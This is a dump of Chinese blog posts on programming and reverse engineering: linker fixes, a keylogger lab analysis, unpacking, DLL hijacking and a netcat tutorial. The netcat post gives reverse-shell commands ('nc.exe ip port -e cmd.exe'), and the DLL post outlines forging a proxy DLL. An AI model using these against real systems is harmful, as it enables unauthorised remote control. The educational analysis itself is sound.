2.在左边栏中依次选择：配置属性-&gt;C&#x2F;C++-&gt;预处理器,然后在右边栏的预处理器定义对应的项中删除_WINDOWS, 添加_CONSOLE. 3.在左边栏中依次选择：配置属性-&gt;链接器-&gt;系统,然后在右边栏的SubSystem对应的项改为CONSOLE(&#x2F;SUBSYSTEM:CONSOLE) 二 vs2015丢失msvcp140.dll 无法运行程序 1.可以选择静态编译 初始状态是这样的","text":"一 .无法解析的外部符号 _main，该符号在函数 “int __cdecl invoke_main(void)” (?invoke_main@@YAHXZ) 中被引用window F:\\c\\window\\window\\MSVCRTD.lib(exe_main.obj) &amp;emsp;&amp;emsp;原因是c语言程序找不到适当的入口程序函数 般情况下， &amp;emsp;&amp;emsp;如果是windows程序，那么WinMain是入口函数，在VS2017中新建项目为“win32项目” &amp;emsp;&amp;emsp;如果是dos控制台程序，那么main是入口函数，在VS2017中新建项目为“win32控制台应用程序”而如果入口函数指定不当，很显然c语言运行时找不到配合函数，它就会报告错误。修改设置适应你的需求 &amp;emsp;&amp;emsp;如果是windows程序： 1.菜单中选择 工程-&gt;属性, 弹出属性窗口 2.在左边栏中依次选择：配置属性-&gt;C&#x2F;C++-&gt;预处理器,然后在右边栏的预处理器定义对应的项中删除_CONSOLE, 添加_WINDOWS. 3.在左边栏中依次选择：配置属性-&gt;链接器-&gt;系统,然后在右边栏的SubSystem对应的项改为Windows(&#x2F;SUBSYSTEM:WINDOWS)如果是控制台程序： 1.菜单中选择 工程-&gt;属性, 弹出弹出属性窗口 2.在左边栏中依次选择：配置属性-&gt;C&#x2F;C++-&gt;预处理器,然后在右边栏的预处理器定义对应的项中删除_WINDOWS, 添加_CONSOLE. 3.在左边栏中依次选择：配置属性-&gt;链接器-&gt;系统,然后在右边栏的SubSystem对应的项改为CONSOLE(&#x2F;SUBSYSTEM:CONSOLE) 二 vs2015丢失msvcp140.dll 无法运行程序 1.可以选择静态编译 初始状态是这样的 2.安装vs2015运行库。","categories":[{"name":"编程","slug":"编程","permalink":"http://zwjsfdbb.top/categories/%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"编程","slug":"编程","permalink":"http://zwjsfdbb.top/tags/%E7%BC%96%E7%A8%8B/"}]},{"title":"sublime中文乱码处理","slug":"杂学/sublime乱码处理","date":"2017-09-12T16:00:00.000Z","updated":"2024-03-12T10:09:40.359Z","comments":true,"path":"2017/09/13/杂学/sublime乱码处理/","link":"","permalink":"http://zwjsfdbb.top/2017/09/13/%E6%9D%82%E5%AD%A6/sublime%E4%B9%B1%E7%A0%81%E5%A4%84%E7%90%86/","excerpt":"一、安装包管理器使用Ctrl+~快捷键或者通过View-&gt;Show Console菜单打开命令行，粘贴如下代码 import urllib.request,os; pf = &#39;Package Control.sublime-package&#39;; ipp = sublime.installed_packages_path(); urllib.request.install_opener( urllib.request.build_opener( urllib.request.ProxyHandler()) ); open(os.path.join(ipp, pf), &#39;wb&#39;).write(urllib.request.urlopen( &#39;http://sublime.wbond.net/&#39; + pf.replace(&#39; &#39;,&#39; &#39;)).read()) 顺利的话，此时就可以在Preferences菜单下看到Package Settings和Package Control两个菜单了 二、安装乱码处理插件： 调用ctrl+shift+p,输入：install package，回车，在稍后弹出的安装包框中搜索：ConvertToUTF8或者GBK Encoding Support，选择点击安装；","text":"一、安装包管理器使用Ctrl+~快捷键或者通过View-&gt;Show Console菜单打开命令行，粘贴如下代码 import urllib.request,os; pf = &#39;Package Control.sublime-package&#39;; ipp = sublime.installed_packages_path(); urllib.request.install_opener( urllib.request.build_opener( urllib.request.ProxyHandler()) ); open(os.path.join(ipp, pf), &#39;wb&#39;).write(urllib.request.urlopen( &#39;http://sublime.wbond.net/&#39; + pf.replace(&#39; &#39;,&#39; &#39;)).read()) 顺利的话，此时就可以在Preferences菜单下看到Package Settings和Package Control两个菜单了 二、安装乱码处理插件： 调用ctrl+shift+p,输入：install package，回车，在稍后弹出的安装包框中搜索：ConvertToUTF8或者GBK Encoding Support，选择点击安装；","categories":[{"name":"杂学","slug":"杂学","permalink":"http://zwjsfdbb.top/categories/%E6%9D%82%E5%AD%A6/"}],"tags":[{"name":"杂学","slug":"杂学","permalink":"http://zwjsfdbb.top/tags/%E6%9D%82%E5%AD%A6/"}]},{"title":"shellcode 实现键盘记录样本分析","slug":"逆向/shellcode实现键盘记录样本分析","date":"2017-09-10T16:00:00.000Z","updated":"2024-03-12T13:04:36.229Z","comments":true,"path":"2017/09/11/逆向/shellcode实现键盘记录样本分析/","link":"","permalink":"http://zwjsfdbb.top/2017/09/11/%E9%80%86%E5%90%91/shellcode%E5%AE%9E%E7%8E%B0%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/","excerpt":"1.样本来源于《恶意代码分析实战》的实验样本Lab11-03.exe和Lab11-03.dll.2.首先对Lab11-03.exe进行基础分析，查看字符串和导入导出函数。用strings可以看到 C:\\WINDOWS\\System32\\inet_epar32.dll zzz69806582 net start cisvc C:\\WINDOWS\\System32\\%s cisvc.exe Lab11-03.dll 等字符串，C:\\WINDOWS\\System32\\inet_epar32.dll表示程序可能加载该dll,net start cisvc是服务的启动方式，cisvc.exe代表该程序可能被启动。然后对Lab11-03.dll进行分析，出现了 C:\\WINDOWS\\System32\\kernel64x.dll zzz69806582 GetForegroundWindow GetAsyncKeyState 等，C:\\WINDOWS\\System32\\kernel64x.dll表示程序可能加载该dll，zzz69806582暂时还看不出来有什作用，GetForegroundWindow，GetAsyncKeyState表示这很可能是一个键盘记录器。3.然后进行动态分析，命令行切到当前目录下，运行Lab11-03.exe，用procmon和procexp进行监控， 如图可以看到该样本启动了一个服务。至于启动什么服务，通过procmon来具体看。在进程栏看到了net start cisvc 在文件操作一栏我们可以看到创建并写入了文件inet_epar32.dll,打开了cisvc.exe但是并没有写入文件的操作。","text":"1.样本来源于《恶意代码分析实战》的实验样本Lab11-03.exe和Lab11-03.dll.2.首先对Lab11-03.exe进行基础分析，查看字符串和导入导出函数。用strings可以看到 C:\\WINDOWS\\System32\\inet_epar32.dll zzz69806582 net start cisvc C:\\WINDOWS\\System32\\%s cisvc.exe Lab11-03.dll 等字符串，C:\\WINDOWS\\System32\\inet_epar32.dll表示程序可能加载该dll,net start cisvc是服务的启动方式，cisvc.exe代表该程序可能被启动。然后对Lab11-03.dll进行分析，出现了 C:\\WINDOWS\\System32\\kernel64x.dll zzz69806582 GetForegroundWindow GetAsyncKeyState 等，C:\\WINDOWS\\System32\\kernel64x.dll表示程序可能加载该dll，zzz69806582暂时还看不出来有什作用，GetForegroundWindow，GetAsyncKeyState表示这很可能是一个键盘记录器。3.然后进行动态分析，命令行切到当前目录下，运行Lab11-03.exe，用procmon和procexp进行监控， 如图可以看到该样本启动了一个服务。至于启动什么服务，通过procmon来具体看。在进程栏看到了net start cisvc 在文件操作一栏我们可以看到创建并写入了文件inet_epar32.dll,打开了cisvc.exe但是并没有写入文件的操作。 在注册表一栏并没有看到什么信息。此时我们更换过滤条件，查看一下cisvc.exe进行了哪些操作。可以看到加载inet_epar32.dll，在系统文件夹中创建了kernel64x.dll文件，并写入了一些内容猜测是键盘记录的内容。 4.下面进行静态高级分析。把Lab11-03.exe和Lab11-03.dll分别载入ida进行分析。代码反编译为c可以看到很简单。 首先是把Lab11-03.dll复制为C:\\WINDOWS\\System32\\inet_epar32.dll，然后sub_401070函数时对cisvc.exe的操作，看到是对cisvc.exe进行文件映射然后byte_409030位置的314个字节的内容写到cisvc.exe的开始位置，很显示cisvc.exe插入了一段shellcode,下面查看这段shellcode,在409030位置可以看到是原始字节内容，按c可以反汇编为汇编代码，如图 如图是shellcode 代码，在sehcode 末尾是一些字符串，按a可以显示完整字符串，猜测此shellc是加载该dll,后面的字符串仍然不知道是什么。 此时我们用ida加载inet_epart32.dll也即是Lab11-03.dll，在导出函数中我们可以看到是以上的未知字符串刚好是其的导出函数，分析该函数看到仅仅只是创建了一个线程，分析该线程，可以看到此线程是实现键盘记录的，其记录保存在C:\\WINDOWS\\System32\\kernel64x.dll中。 下面对cisvc.exe进行分析。分析插入shellcode前后的变化。首先用PE view查看pe头的变化。可以看到入口位置发生了变化。 分别用ida载入，可以看到插入shellcode的cisvc.exe入口点直接就是shellcode代码，在od中载入，然后单步运行观察shellcode的功能。 如图1001b0a位置是加载C:\\WINDOWS\\System32\\inet_epar32.dll的位置，下面是获取zzz69806582函数地址。到此整个流程就分析完了。 Lab11-03.exe把Lab11-03.dll复制为C:\\WINDOWS\\System32\\inet_epar32.dll，启动cisvc服务，然后再cisvc.exe中插入一段shellcode，来实现键盘记录，记录保存在C:\\WINDOWS\\System32\\kernel64x.dll。打开notepad随便输入进行测试，然后用flexhex打开C:\\WINDOWS\\System32\\kernel64x.dll，可以看到记录了notepad和输入的内容。","categories":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/categories/%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/tags/%E9%80%86%E5%90%91/"}]},{"title":"常规脱壳","slug":"逆向/常规脱壳","date":"2017-08-08T16:00:00.000Z","updated":"2024-03-12T11:14:41.850Z","comments":true,"path":"2017/08/09/逆向/常规脱壳/","link":"","permalink":"http://zwjsfdbb.top/2017/08/09/%E9%80%86%E5%90%91/%E5%B8%B8%E8%A7%84%E8%84%B1%E5%A3%B3/","excerpt":"总结方法如下： 1、单步跟（向上的跳转下一步F4） 2、esp定律 3、二次内存镜像 4、一次到位 5、模拟跟踪 tc eip&lt;sfx 调试 sfx 第二个 6、最后一次异常 7、特殊方法 at GetVersion等","text":"总结方法如下： 1、单步跟（向上的跳转下一步F4） 2、esp定律 3、二次内存镜像 4、一次到位 5、模拟跟踪 tc eip&lt;sfx 调试 sfx 第二个 6、最后一次异常 7、特殊方法 at GetVersion等 8、注意事项当用OD插件脱壳后不能运行时，可以用loadpe修正镜像大小，然后再重建输入表，再看是否成功，不行的话，手动找一找IAT的起始位置和结束为止，看Import REC 的RVA和大小是否一致，如果还不行就用load pe重建PE 9、常用语言的入口特征： VB： 004012D4 &gt; 68 54474000 push QQ个性网.00404754 004012D9 E8 F0FFFFFF call &lt;jmp.&amp;MSVBVM60.#100&gt; 004012DE 0000 add byte ptr ds:[eax],al 004012E0 0000 add byte ptr ds:[eax],al 004012E2 0000 add byte ptr ds:[eax],al 004012E4 3000 xor byte ptr ds:[eax],al 004012E6 0000 add byte ptr ds:[eax],al 004012E8 48 dec eax delphi: 004A5C54 &gt; 55 push ebp 004A5C55 8BEC mov ebp,esp 004A5C57 83C4 F0 add esp,-10 004A5C5A B8 EC594A00 mov eax,openpro.004A59EC BC++: 00401678 &gt; /EB 10 jmp short btengine.0040168A 0040167A |66:623A bound di,dword ptr ds:[edx] 0040167D |43 inc ebx 0040167E |2B2B sub ebp,dword ptr ds:[ebx] 00401680 |48 dec eax 00401681 |4F dec edi 00401682 |4F dec edi 00401683 |4B dec ebx 00401684 |90 nop 00401685 -|E9 98005400 jmp 00941722 0040168A \\A1 8B005400 mov eax,dword ptr ds:[54008B] 0040168F C1E0 02 shl eax,2 00401692 A3 8F005400 mov dword ptr ds:[54008F],eax 00401697 52 push edx 00401698 6A 00 push 0 0040169A E8 99D01300 call &lt;jmp.&amp;KERNEL32.GetModuleHandleA&gt; 0040169F 8BD0 mov edx,eax VC++: 0040A41E &gt; 55 push ebp 0040A41F 8BEC mov ebp,esp 0040A421 6A FF push -1 0040A423 68 C8CB4000 push 跑跑排行.0040CBC8 0040A428 68 A4A54000 push &lt;jmp.&amp;MSVCRT._except_handler3&gt; 0040A42D 64:A1 00000000 mov eax,dword ptr fs:[0] 0040A433 50 push eax 0040A434 64:8925 0000000&gt;mov dword ptr fs:[0],esp 0040A43B 83EC 68 sub esp,68 0040A43E 53 push ebx 0040A43F 56 push esi 0040A440 57 push edi MASM(汇编): 004035C9 &gt; 6A 00 push 0 004035CB E8 A20A0000 call &lt;jmp.&amp;kernel32.GetModuleHandleA&gt; 004035D0 A3 5B704000 mov dword ptr ds:[40705B],eax 004035D5 68 80000000 push 80 004035DA 68 2C754000 push 11.0040752C 004035DF FF35 5B704000 push dword ptr ds:[40705B] 004035E5 E8 820A0000 call &lt;jmp.&amp;kernel32.GetModuleFileNameA&gt; 004035EA E8 87070000 call 11.00403D76 004035EF 6A 00 push 0 004035F1 68 0B364000 push 11.0040360B 004035F6 6A 00 push 0 004035F8 6A 64 push 64 004035FA FF35 5B704000 push dword ptr ds:[40705B]","categories":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/categories/%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/tags/%E9%80%86%E5%90%91/"}]},{"title":"汇编知识学习","slug":"编程/汇编知识学习","date":"2017-08-05T16:00:00.000Z","updated":"2024-03-12T11:12:05.326Z","comments":true,"path":"2017/08/06/编程/汇编知识学习/","link":"","permalink":"http://zwjsfdbb.top/2017/08/06/%E7%BC%96%E7%A8%8B/%E6%B1%87%E7%BC%96%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0/","excerpt":"1.MOVSX 带符号扩展指令 MOV BL,80H MOVSX AX,BL AX=0FF80H 因为带符号扩展的时候，高位视为符号位，扩展的高位全置1 2.neg eax sbb eax ,eax 例如 neg r sbb r-r neg eax 就是0-eax 其实际上就是设置标志位 cf=1 sbb eax,eax 就是eax-eax-cf 如果r=0; cf=0 ;最后结果就是把r 设为0，如果r不等于0，则cf=1 相当于r-r-cf=-1=oxffffffff 注意： MOVzX 无符号扩展指令 3.test 指令 test eax,eax 基本上和 And eax,eax 是一样的，不同的是test 不改变eax的结果，只是改变FLAG寄存器的状态，也就是改变进位标志，零标志，溢出标志等 等。举一个例子，如果eax=01h,test eax,eax 就是两个01h 作与操作，所以结果还是01h,不是0的话，就不会跳转 je xxxx。所以要跳转je xxxx,只有一种可能就是eax=0h.所以现在eax=0x01 则不会跳转 je xxxx 4.__alloca_probe 逆向vc编译的程序，经常会看到这样的代码出现在函数头部： mov eax, xxxxh call __alloca_probe xxxxh是个立即数，一般大于1000h,即十进制数4096。 这段代码经常出现在函数头prolog之后，如果有异常结构，会出现在SEH或EH之后。 示例1： push ebp mov ebp, esp mov eax, 8080h call __alloca_probe 示例2： push ebp mov ebp, esp and esp, 0FFFFFFF8h push 0FFFFFFFFh push offset SEH_4A7AA0 mov eax, large fs:0 push eax mov large fs:0, esp push ecx mov eax, 8080h call __alloca_probe 事实上__alloca_probe是一个在stack上分配大块内存空间函数，功能同SUB ESP, xxxxh一致。函数本身由编译器提供，编译的时候vc会根据实际情况（stack上申请大块空间，一般大于一个内存页大小）插入到函数体，为函数在stack上提供私有变量空间，分配的空间大小由fastcall调用方式的EAX寄存器传入。 5.chkstk函数 分配较大局部变量空间时chkstk函数来检测是否超过堆栈上已经分配的空间","text":"1.MOVSX 带符号扩展指令 MOV BL,80H MOVSX AX,BL AX=0FF80H 因为带符号扩展的时候，高位视为符号位，扩展的高位全置1 2.neg eax sbb eax ,eax 例如 neg r sbb r-r neg eax 就是0-eax 其实际上就是设置标志位 cf=1 sbb eax,eax 就是eax-eax-cf 如果r=0; cf=0 ;最后结果就是把r 设为0，如果r不等于0，则cf=1 相当于r-r-cf=-1=oxffffffff 注意： MOVzX 无符号扩展指令 3.test 指令 test eax,eax 基本上和 And eax,eax 是一样的，不同的是test 不改变eax的结果，只是改变FLAG寄存器的状态，也就是改变进位标志，零标志，溢出标志等 等。举一个例子，如果eax=01h,test eax,eax 就是两个01h 作与操作，所以结果还是01h,不是0的话，就不会跳转 je xxxx。所以要跳转je xxxx,只有一种可能就是eax=0h.所以现在eax=0x01 则不会跳转 je xxxx 4.__alloca_probe 逆向vc编译的程序，经常会看到这样的代码出现在函数头部： mov eax, xxxxh call __alloca_probe xxxxh是个立即数，一般大于1000h,即十进制数4096。 这段代码经常出现在函数头prolog之后，如果有异常结构，会出现在SEH或EH之后。 示例1： push ebp mov ebp, esp mov eax, 8080h call __alloca_probe 示例2： push ebp mov ebp, esp and esp, 0FFFFFFF8h push 0FFFFFFFFh push offset SEH_4A7AA0 mov eax, large fs:0 push eax mov large fs:0, esp push ecx mov eax, 8080h call __alloca_probe 事实上__alloca_probe是一个在stack上分配大块内存空间函数，功能同SUB ESP, xxxxh一致。函数本身由编译器提供，编译的时候vc会根据实际情况（stack上申请大块空间，一般大于一个内存页大小）插入到函数体，为函数在stack上提供私有变量空间，分配的空间大小由fastcall调用方式的EAX寄存器传入。 5.chkstk函数 分配较大局部变量空间时chkstk函数来检测是否超过堆栈上已经分配的空间 ​ ​ 我的理解就是ecx保存未调用此函数前esp的值，随后每次减去一页的空间也就是1000h,​ eax保存的就是所有要分配的空间，每次分配一页之后也减去1000h,然后比较eax和1000h的值，看是否还需要一页，如果大于1000h,继续循环。否则用ecx减去eax得到最终分配的空间栈顶位置，然后把ecx的值赋给esp,跳回函数的返回地址，结束分配。 6.JGE.JLE,JNE,JE跳转条件 JGE 大于等于跳转，JLE小于等于跳转，JNE不等于跳转，JE 前等于后跳转 7.字符串入栈的操作： void main()&#123; 01361000 push ebp 01361001 mov ebp,esp 01361003 sub esp,0Ch //栈顶抬高12个字节 01361006 mov eax,dword ptr [___security_cookie (1363000h)] 0136100B xor eax,ebp 0136100D mov dword ptr [ebp-4],eax //用了4个字节 int intA; char ch[5]=&quot;abcd&quot;; 01361010 mov eax,dword ptr [string &quot;abcd&quot; (136210Ch)] 01361015 mov cl,byte ptr ds:[1362110h] //两句传送字符串”abcd\\0”到寄存器 intA=15; fun(intA,ch); 0136101B lea edx,[ebp-0Ch] // 0136101E push edx //数组地址,ch[] 0136101F push 0Fh //立即数参数,15 01361021 push offset string &quot;Integer:%d String:%s&quot; (13620F4h) 01361026 mov dword ptr [ebp-0Ch],eax 01361029 mov byte ptr [ebp-8],cl //两句语句表示”abcd\\0”写入栈中 0136102C call dword ptr [__imp__printf (13620A0h)] //调用printf &#125; cl 这个赋值一直不太懂，后来知道了字符串要以00结尾才行，所以要再赋值cl为00，然后放在abcd的后面。 8.atoi 函数 字符串转变为数字","categories":[{"name":"编程","slug":"编程","permalink":"http://zwjsfdbb.top/categories/%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"编程","slug":"编程","permalink":"http://zwjsfdbb.top/tags/%E7%BC%96%E7%A8%8B/"}]},{"title":"数据隐藏-ADS","slug":"逆向/数据隐藏-ADS","date":"2017-08-05T16:00:00.000Z","updated":"2024-03-12T09:46:42.827Z","comments":true,"path":"2017/08/06/逆向/数据隐藏-ADS/","link":"","permalink":"http://zwjsfdbb.top/2017/08/06/%E9%80%86%E5%90%91/%E6%95%B0%E6%8D%AE%E9%9A%90%E8%97%8F-ADS/","excerpt":"NTFS交换数据流（Alternate Data Streams，简称ADS）是NTFS磁盘格式的一个特性。在NTFS文件系统下，每个文件都可以存在多个数据流，意思是除了主文件流之外还可以有许多非主文件流寄宿在主文件流中，这些利用NTFS数据流寄宿并隐藏在系统中的非主文件流我们称之为ADS流文件。虽然我们无法看到ADS流文件，但它们却是真实存在。某些病毒利用NTFS数据流来隐藏，此类病毒我们称之为ADS流病毒或ZeroAcess。 详见ADS","text":"NTFS交换数据流（Alternate Data Streams，简称ADS）是NTFS磁盘格式的一个特性。在NTFS文件系统下，每个文件都可以存在多个数据流，意思是除了主文件流之外还可以有许多非主文件流寄宿在主文件流中，这些利用NTFS数据流寄宿并隐藏在系统中的非主文件流我们称之为ADS流文件。虽然我们无法看到ADS流文件，但它们却是真实存在。某些病毒利用NTFS数据流来隐藏，此类病毒我们称之为ADS流病毒或ZeroAcess。 详见ADS","categories":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/categories/%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/tags/%E9%80%86%E5%90%91/"}]},{"title":"进程替换的一种方式","slug":"逆向/进程替换的一种检测方式","date":"2017-08-05T16:00:00.000Z","updated":"2024-03-12T09:46:02.210Z","comments":true,"path":"2017/08/06/逆向/进程替换的一种检测方式/","link":"","permalink":"http://zwjsfdbb.top/2017/08/06/%E9%80%86%E5%90%91/%E8%BF%9B%E7%A8%8B%E6%9B%BF%E6%8D%A2%E7%9A%84%E4%B8%80%E7%A7%8D%E6%A3%80%E6%B5%8B%E6%96%B9%E5%BC%8F/","excerpt":"进程替换问题 svchost.exe 经常被替换，鉴定的一种方式是通过process explorer 查看磁盘和内存中的字符串是否一致来判断。","text":"进程替换问题 svchost.exe 经常被替换，鉴定的一种方式是通过process explorer 查看磁盘和内存中的字符串是否一致来判断。","categories":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/categories/%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/tags/%E9%80%86%E5%90%91/"}]},{"title":"netcat-反向shell","slug":"黑客工具/netcat—反向shell","date":"2017-08-05T16:00:00.000Z","updated":"2024-03-12T11:14:14.121Z","comments":true,"path":"2017/08/06/黑客工具/netcat—反向shell/","link":"","permalink":"http://zwjsfdbb.top/2017/08/06/%E9%BB%91%E5%AE%A2%E5%B7%A5%E5%85%B7/netcat%E2%80%94%E5%8F%8D%E5%90%91shell/","excerpt":"利用在网络工具中有“瑞士军刀”美誉的NetCat实现反向shell 1.windows端下载netcat程序，加入环境变量，cmd执行nc命令 nc.exe ip 端口 -e cmd.exe 2.linux 主机执行 nc -l -p 80 3.在windows主机上就建立了一个反向 的shell,在linux主机上就可以直接操作了。","text":"利用在网络工具中有“瑞士军刀”美誉的NetCat实现反向shell 1.windows端下载netcat程序，加入环境变量，cmd执行nc命令 nc.exe ip 端口 -e cmd.exe 2.linux 主机执行 nc -l -p 80 3.在windows主机上就建立了一个反向 的shell,在linux主机上就可以直接操作了。","categories":[{"name":"黑客工具","slug":"黑客工具","permalink":"http://zwjsfdbb.top/categories/%E9%BB%91%E5%AE%A2%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"黑客工具","slug":"黑客工具","permalink":"http://zwjsfdbb.top/tags/%E9%BB%91%E5%AE%A2%E5%B7%A5%E5%85%B7/"}]},{"title":"dll加载和劫持","slug":"逆向/dll加载和劫持","date":"2017-08-02T16:00:00.000Z","updated":"2024-03-12T09:47:19.177Z","comments":true,"path":"2017/08/03/逆向/dll加载和劫持/","link":"","permalink":"http://zwjsfdbb.top/2017/08/03/%E9%80%86%E5%90%91/dll%E5%8A%A0%E8%BD%BD%E5%92%8C%E5%8A%AB%E6%8C%81/","excerpt":"一.dll加载顺序 DLL查找路径基础 &amp;emsp;&amp;emsp;应用程序可以通过以下方式控制一个DLL的加载路径：使用全路径加载、使用DLL重定向、使用manifest文件。如果上述三种方式均未指定，系统查找DLL的顺序将按照本部分描述的顺序进行。 &amp;emsp;&amp;emsp;对于以下两种情况的DLL，系统将不会查找，而是直接加载： &amp;emsp;&amp;emsp;a. 对于已经加载到内存中的同名DLL，系统使用已经加载的DLL，并且忽略待加载DLL的路径。（注意对某个进程而言，系统已经加载的DLL一定是唯一的存在于某个目录下。） &amp;emsp;&amp;emsp;b. 如果该DLL存在于某个Windows版本的已知DLL列表（unkown DLL）中，系统使用已知DLL的拷贝（包括已知DLL的依赖项）。已知DLL列表可以从如下注册表项看到：HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\KnownDLLs。 &amp;emsp;&amp;emsp;这里有个比较坑的地方，对于有依赖项的DLL（即使使用全路径指定DLL位置），系统查找其所依赖DLL的方法是按照实际的模块名称来的，因此如果加载的DLL不在系统查找顺序目录下，那么动态加载该DLL（LoadLibrary）会返回一个”找不到模块”的错误。 2.系统标准DLL查找顺序 &amp;emsp;&amp;emsp;系统使用的标准DLL查找顺序依赖于是否设置了”安全DLL查找模式”（safe DLL search mode）。”安全DLL查找模式”会将用户当前目录置于查找顺序的后边。“安全DLL查找模式”默认是启用的，禁用的话，可以将注册表项HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\SafeDllSearchMode设为0。调用SetDllDirectory函数可以禁用”安全DLL查找模式”，并修改DLL查找顺序。Windows XP下，”安全DLL查找模式”默认是禁用的，需要启用该项的话，在注册表中新建一个SafeDllSearchMode子项，并赋值为1即可。”安全DLL查找模式”从Windows XP SP2开始，默认是启用的。 &amp;emsp;&amp;emsp;启用”安全DLL查找模式”时，查找顺序如下：","text":"一.dll加载顺序 DLL查找路径基础 &amp;emsp;&amp;emsp;应用程序可以通过以下方式控制一个DLL的加载路径：使用全路径加载、使用DLL重定向、使用manifest文件。如果上述三种方式均未指定，系统查找DLL的顺序将按照本部分描述的顺序进行。 &amp;emsp;&amp;emsp;对于以下两种情况的DLL，系统将不会查找，而是直接加载： &amp;emsp;&amp;emsp;a. 对于已经加载到内存中的同名DLL，系统使用已经加载的DLL，并且忽略待加载DLL的路径。（注意对某个进程而言，系统已经加载的DLL一定是唯一的存在于某个目录下。） &amp;emsp;&amp;emsp;b. 如果该DLL存在于某个Windows版本的已知DLL列表（unkown DLL）中，系统使用已知DLL的拷贝（包括已知DLL的依赖项）。已知DLL列表可以从如下注册表项看到：HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\KnownDLLs。 &amp;emsp;&amp;emsp;这里有个比较坑的地方，对于有依赖项的DLL（即使使用全路径指定DLL位置），系统查找其所依赖DLL的方法是按照实际的模块名称来的，因此如果加载的DLL不在系统查找顺序目录下，那么动态加载该DLL（LoadLibrary）会返回一个”找不到模块”的错误。 2.系统标准DLL查找顺序 &amp;emsp;&amp;emsp;系统使用的标准DLL查找顺序依赖于是否设置了”安全DLL查找模式”（safe DLL search mode）。”安全DLL查找模式”会将用户当前目录置于查找顺序的后边。“安全DLL查找模式”默认是启用的，禁用的话，可以将注册表项HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\SafeDllSearchMode设为0。调用SetDllDirectory函数可以禁用”安全DLL查找模式”，并修改DLL查找顺序。Windows XP下，”安全DLL查找模式”默认是禁用的，需要启用该项的话，在注册表中新建一个SafeDllSearchMode子项，并赋值为1即可。”安全DLL查找模式”从Windows XP SP2开始，默认是启用的。 &amp;emsp;&amp;emsp;启用”安全DLL查找模式”时，查找顺序如下： a . 应用程序所在目录； b. 系统目录。GetSystemDirectory返回的目录，通常是系统盘\\Windows\\System32；c. 16位系统目录。该项只是为了向前兼容的处理，可以不考虑；d. Windows目录。GetWindowsDirectory返回的目录，通常是系统盘\\Windows；e. 当前目录。GetCurrentDirectory返回的目录；f. 环境变量PATH中所有目录。 如果”安全DLL查找模式”被禁用，查找顺序如下：a. 应用程序所在目录；b. 当前目录。GetCurrentDirectory返回的目录；c. 系统目录。GetSystemDirectory返回的目录，通常是系统盘\\Windows\\System32；d. 16位系统目录。该项只是为了向前兼容的处理，可以不考虑；e. Windows目录。GetWindowsDirectory返回的目录，通常是系统盘\\Windows；f. 环境变量PATH中所有目录。 修改系统DLL查找顺序系统使用的标准DLL查找顺序可以通过以下两种方式调整：3.1 使用LOAD_WITH_ALTERED_SEARCH_PATH标志调用LoadLibraryEx函数；这种方式调用LoadLibraryEx函数，需要设置lpFileName参数（绝对路径）。与标准查找策略不同的是，使用LOAD_WITH_ALTERED_SEARCH_PATH标志调用LoadLibraryEx函数的DLL查找顺序将”查找应用程序所在目录”修改为lpFileName指定的目录。3.2 调用SetDllDirectory函数。注意：SetDllDirectory函数在Windows XP SP1开始支持的。函数SetDllDirectory在调用参数lpPathName是一个路径时，可支持修改DLL搜索路径。修改之后的搜索顺序如下：a. 应用程序所在目录；b. 函数SetDllDirectory参数lpPathName给定的目录；c. 系统目录。GetSystemDirectory返回的目录，通常是系统盘\\Windows\\System32；d. 16位系统目录。该项只是为了向前兼容的处理，可以不考虑；e. Windows目录。GetWindowsDirectory返回的目录，通常是系统盘\\Windows；f. 环境变量PATH中所有目录。如果lpPathName参数为空字符串，这样就会把当前目录从DLL搜索路径中去掉。如果用NULL参数调用SetDllDirectory函数，可以恢复按照系统注册表的”安全DLL查找模式”来查找DLL。 当然win8或者windows server 2012提供更多的可定制方法，这个可以参考MSDN上介绍。比如：SetDefaultDllDirectories、 AddDllDirectory、RemoveDllDirectory。 4.为了测试计算机系统的dll 加载顺序可以通过一个程序加载一个不存在的dll,然后用process monitor 来监控加载的行为。 #include &lt;windows.h&gt; #include &lt;iostream&gt; int main(int argc, char ** argv) &#123; using std::cout; using std::endl; // 随便设置一个不存在的dll名 HMODULE hMod = LoadLibrary(&quot;123.dll&quot;); if (NULL != hMod) FreeLibrary(hMod); cout &lt;&lt; &quot;LoadLibrary Test&quot; &lt;&lt; endl; return 0; &#125; 5.通过process monitor 实际测试win10 64位发现加载顺序是 • 应用程序所在目录 • 系统目录（首先是c:\\Windows\\SysWOW64；然后是c:\\Windows\\System） • windows目录 • 当前目录 • 环境变量path目录 二 dll 劫持 &amp;emsp;&amp;emsp;由于输入表中只包含DLL名而没有它的路径名，因此加载程序必须在磁盘上搜索DLL文件。首先会尝试从当前程序所在的目录加载DLL，如果没找到，则在Windows系统目录中查找，最后是在环境变量中列出的各个目录下查找。利用这个特点，先伪造一个系统同名的DLL，提供同样的输出表，每个输出函数转向真正的系统DLL。程序调用系统DLL时会先调用当前目录下伪造的DLL，完成相关功能后，再跳到系统DLL同名函数里执行。这个过程用个形象的词来描述就是系统DLL被劫持（hijack）了。 